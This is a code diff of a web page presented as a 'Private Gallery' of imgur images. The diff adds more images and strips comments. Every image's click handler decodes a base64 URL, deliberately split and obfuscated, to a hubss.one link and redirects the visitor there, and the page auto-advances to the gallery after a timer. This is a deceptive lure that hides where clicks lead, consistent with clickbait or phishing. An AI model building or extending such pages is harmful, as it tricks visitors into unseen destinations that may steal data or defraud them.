@@ -20,7 +20,6 @@ body {
   color:white;
 }
 
-/* LOADING */
 #loading {
   position:fixed;
   width:100%;
@@ -46,7 +45,6 @@ body {
   100% {transform:rotate(360deg);}
 }
 
-/* ENTER */
 #enterScreen {
   display:none;
   height:100vh;
@@ -66,7 +64,6 @@ button {
   cursor:pointer;
 }
 
-/* GALLERY */
 #galleryPage {
   display:none;
   text-align:center;
@@ -100,20 +97,17 @@ button {
 
 <body>
 
-<!-- LOADING -->
 <div id="loading">
   <div class="loader"></div>
   <p style="opacity:0.6;">Loading content...</p>
 </div>
 
-<!-- ENTER -->
 <div id="enterScreen">
   <h2>Private Gallery</h2>
   <p style="opacity:0.7;">Tap below or wait a moment…</p>
   <button onclick="_0xA12_enter()">Enter</button>
 </div>
 
-<!-- GALLERY -->
 <div id="galleryPage">
 
   <h2>Private Collection</h2>
@@ -130,6 +124,12 @@ button {
     <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="_0xA12_go()">
     <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="_0xA12_go()">
     <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/AOM9fTf.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/d9gZSs3.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/AxmBfxf.jpeg" onclick="_0xA12_go()">
   </div>
 
   <p style="opacity:0.6; font-size:13px;">
@@ -149,25 +149,23 @@ setTimeout(() => {
   document.getElementById("loading").style.display = "none";
   document.getElementById("enterScreen").style.display = "flex";
 
-  // AUTO MASUK setelah 3 detik
   setTimeout(() => {
     _0xA12_enter();
   }, 3000);
 
 }, 1500);
 
-// enter manual / auto
+// enter
 function _0xA12_enter() {
   document.getElementById("enterScreen").style.display = "none";
   document.getElementById("galleryPage").style.display = "block";
 }
 
-// obfuscated link (split)
+// obfuscated link (VALID)
 const _0x1 = "aHR0cHM6Ly9mZGVk";
-const _0x2 = "ZGcuaHVic3Mub25l"; // ✅ BENAR (hubss)
+const _0x2 = "ZGcuaHVic3Mub25l";
 const _0x3 = "L3AvbmhWTnk=";
 
-// redirect
 function _0xA12_go() {
   const _0xdecoded = atob(_0x1 + _0x2 + _0x3);
   setTimeout(() => {
